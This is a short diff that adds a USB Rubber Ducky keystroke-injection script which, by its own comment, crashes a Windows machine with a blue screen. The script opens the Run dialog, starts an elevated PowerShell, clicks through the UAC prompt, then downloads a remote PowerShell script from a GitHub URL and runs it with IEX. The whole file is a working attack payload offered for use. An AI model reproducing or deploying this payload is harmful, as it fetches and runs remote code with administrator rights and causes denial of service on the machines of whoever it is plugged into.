@@ -1,0 +1,12 @@
+REM This script will BSOD your windows machine - Be Careful
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 200
+STRING IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
+DELAY 100
+ENTER
